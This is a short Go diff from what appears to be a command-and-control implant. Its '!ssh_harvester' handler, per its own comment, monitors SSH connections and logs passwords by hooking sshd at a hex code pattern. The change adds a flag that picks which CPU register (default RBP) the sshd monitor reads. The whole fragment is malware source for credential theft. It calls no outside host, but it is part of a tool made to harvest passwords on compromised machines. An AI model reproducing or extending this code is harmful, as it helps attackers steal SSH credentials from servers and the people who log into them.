@@ -41,6 +41,7 @@ func platformC2CommandsHandler(cmdSlice []string, cmd_id string) (out string) {
 		// Usage: !ssh_harvester
 		// Starts monitoring SSH connections and logs passwords.
 		code_pattern := flags.StringP("code_pattern", "p", "", "Code pattern")
+		reg_name := flags.StringP("reg_name", "r", "RBP", "Register name")
 		flags.Parse(cmdSlice[1:])
 		code_pattern_bytes, err := hex.DecodeString(*code_pattern)
 		if err != nil {
@@ -49,7 +50,7 @@ func platformC2CommandsHandler(cmdSlice []string, cmd_id string) (out string) {
 		}
 
 		harvester_log_stream := make(chan string, 4096)
-		go sshd_monitor(harvester_log_stream, code_pattern_bytes)
+		go sshd_monitor(harvester_log_stream, code_pattern_bytes, *reg_name)
 		go func() {
 			for {
 				out = <-harvester_log_stream
